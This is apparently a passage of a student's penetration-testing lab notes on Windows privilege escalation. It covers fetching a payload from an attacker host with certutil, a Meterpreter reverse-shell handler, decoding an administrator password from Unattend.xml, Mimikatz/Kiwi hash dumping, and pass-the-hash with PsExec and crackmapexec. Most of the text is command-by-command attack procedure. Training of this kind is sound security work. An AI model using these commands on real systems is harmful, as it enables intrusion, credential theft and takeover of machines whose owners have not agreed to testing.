				- `-urlcache`: This option is used to download a file from a specified URL and cache it on the local system.
				- `-f`: This option stands for "force," and it is used to overwrite any existing file with the same name during the download.
				- `http://yourip/payload.exe`: This is the URL of the file you want to download. Replace `yourip` with the IP address or domain where the file is hosted.
				- `payload.exe`: This is the name given to the downloaded file on the local system.
	- go back to webserver and shut it down (file has been downloaded)
	- set up msfconsole and set up multi/handler 
		- set payload windows/x64/meterpreter/reverse_tcp, LPORT 1234 LHOST kali ip 
		- Once you go back to the victim system and you click on the payload a meterpreter session will be started in the multi/handler 
		- sysinfo 
		- search -f Unattend.xml    (located: C:\Windows\Panther\Unattend.xml)
		- cd to C:\\Windows\\Panther\\Unattend.xml
		- dir 
		- download unattend.xml 
		- go into new window outside Metasploit 
	- in new terminal locate the file that you downloaded from victim
		- cat unattend.xml
		- look for user credentials  (autologon)
		- the password (plaintext is false) is in base64 
		- we create a new file: vim password.txt 
			- paste the base64 password, quit 
		- use base64 package: base64 -d password.txt 
		- test the password: psexec.py Administrator@targetip 
			- enter password 
			- whoami 

Administrators often forget to delete these kind of files. Hackers can use these files to attain privileged account by getting the password from Unattended Windows Setup utility configuration file

### Dumping Hashes With mimikatz 

Mimikatz 
- Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
- The SAM (Security Account Manager) database, is a database file on Windows systems
that stores hashed user passwords.
- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
- Note: Mimikatz will require elevated privileges in order to run correctly


Demo 
- perform nmap 
- start up mfsconsole 
- search exploit module for BadBlue 
- use the passthru , configure rhost, lhost and lport and exploit
- meterpreter session on the target system 
	- sysinfo 
	- getuid 
	- migrate to lsass.exe find processid: pgrep lsass - migrate to lsass
		- we need higher priviliges for lsass 
	- sysinfo (authority\\system is the highest privileges')
	- we will use kiki
		- load kiwi 
		- ?
		- attempt to retrieve credentials such as usernames, passwords, domain information, and NTLM hashes for logged-in users.: **creds_all** 
			- later versions of  windows  do not store cleartext passwords 
		- Mimikatz commands can be used to extract NTLM hashes via the LSA: **lsa_dump_sam** 
			- SAM is encrypted with syskey, also provided by kiwi 
			- specifically targets the SAM database to retrieve password hashes.
		- clear 
	- pwd 
	- navigate to C:\\\\ 
		- mkdir Temp 
		- upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
		- open a command shell session: shell
			- dir 
			- execute mimikatz: .\\mimikatz.exe 
			- privilege::debug ![[Pasted image 20230707131337.png]]
							 if it is 20= you have required privileges to perform hash extraction from memory 
		- Mimikatz: lsadump::sam
			- RID 500 -> this is indeed administrator 
		- Mimikatz: lsadump::secret 
		- Mimikatz: sekurlsa::logonpasswords  ![[Pasted image 20230707132811.png]]
				null means cleartext passwords have been disabled 
		- 

1. **"lsa_dump_all"** is a Kiwi command in Mimikatz that is used to dump various types of information from the Local Security Authority (LSA) subsystem. It retrieves data such as secrets, cached credentials, security packages, and other relevant information stored in the LSA.
    
2. **"sekurlsa::logonpasswords"** is a Mimikatz command that retrieves plaintext passwords and password hashes for active logon sessions on the target system. It leverages the functionality of the Security Account Manager (SAM) and the Local Security Authority Subsystem Service (LSASS) to extract this information from memory.
    
3. **"lsadump::sam"** is a Mimikatz command that specifically focuses on dumping the Security Account Manager (SAM) database from the target system. The SAM database stores user account information, including usernames and password hashes. By executing this command, Mimikatz extracts the password hashes stored in the SAM database.
    
4. **"sekurlsa::sam"** is a Mimikatz command that extracts password hashes from the Security Account Manager (SAM) database in memory. It specifically targets the SAM and retrieves the password hashes, allowing further analysis, cracking, or other security-related activities.




### Pass-The-Hash Attacks 

Pass-THe-Hash

- Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
	+ We can use multiple tools to facilitate a Pass-The-Hash attack:
	+ Metasploit PsExec module
	+ Crackmapexec
- This technique will allow us to obtain access to the target system via legitimate
	credentials as opposed to obtaining access via service exploitation

Why is this important? you already have access? What if it is patched or firewall rule is enabled then you cannot exploit that service anymore? If you had a hash you could still exploit that service even if original vulnerable service has been patched or disabled 

Demo 

- turn on a msfconsole: 
	- search badblue 
	- use passtru, set rhost and exploit 
- meterpreter session on target system
	- pgrep lsass - migrate 
	- get uid 
	- load kiwi 
	- lsa_dump_sam 
	- take the administrator NTLM hash and put it in a textfile 

- how to perform password hash attack - you need ntlm and lm hash
	- hashdump 
	- put the meterpreter in the background with control + Z 
- Search psexec 
	- use ![[Pasted image 20230707142752.png]]
					for this module you need credentials
		- use default payload 
		- type session: to check what port the session is using; make sure the lport matches with the session running in the back
		- set smbuser Administrator 
		- set smbpass {paste the hash}
		- set target 
			-  set target Native\\ upload   
		- now you have a meterpreter session with elevated privileges 
			- sysinfo 
			- getuid 
			- now you have authority\\system privileges' 
			  
Above we used psexec for pas the hash attack but you can also use other tools such as: crackmapexe

- crackmapexec smb targetip -u Administrator -H "{hash}"
- try to execute commands
	- crackmapexec smb targetip -u Administrator -H "{hash}" -x "ipconfig"
	- crackmapexec smb targetip -u Administrator -H "{hash}" -x "net user"



In summary, CrackMapExec is focused on password auditing and Windows network exploitation, Evil-WinRM enables remote command execution on Windows systems, Cadaver is used for interacting with WebDAV servers, and msfvenom is a payload generator for creating malicious payloads within the Metasploit Framework. 


